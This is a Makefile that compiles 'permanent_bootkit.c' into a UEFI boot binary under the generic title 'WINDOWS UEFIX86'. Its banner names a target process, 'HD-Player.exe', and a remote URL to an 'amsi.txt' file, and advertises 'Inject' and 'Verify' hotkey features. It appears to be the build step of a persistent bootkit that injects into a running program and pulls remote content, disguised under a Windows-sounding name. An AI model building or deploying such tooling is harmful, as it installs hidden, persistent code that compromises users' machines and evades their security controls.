# ============================================================
# MAKEFILE - BUILD WINDOWS UEFIX86
# ============================================================

SRC = permanent_bootkit.c
TARGET = bootx86.efi

all:
	@echo "Building WINDOWS UEFIX86..."
	gcc -I/usr/include/efi -I/usr/include/efi/x86_64 \
	    -fno-stack-protector -fpic -fshort-wchar -mno-red-zone \
	    -Wall -O2 -D__GNU_EFI__ -DMDE_CPU_X64 \
	    -c $(SRC) -o $(SRC:.c=.o)
	ld -T /usr/lib/elf_x86_64_efi.lds -shared -Bsymbolic \
	   -L/usr/lib -lgnuefi -lefi -nostdlib -znocombreloc \
	   $(SRC:.c=.o) -o $(TARGET).so
	objcopy -O binary $(TARGET).so $(TARGET)
	@echo ""
	@echo "============================================"
	@echo "[+] $(TARGET) built successfully!"
	@echo "    Title: WINDOWS UEFIX86"
	@echo "    Target: HD-Player.exe"
	@echo "    URL: http://raw.githubusercontent.com/aswinxks/amsi32/refs/heads/main/amsi.txt"
	@echo "    Features: F9 Inject | F8+F11 Verify"
	@echo "============================================"

clean:
	rm -f *.o *.so $(TARGET)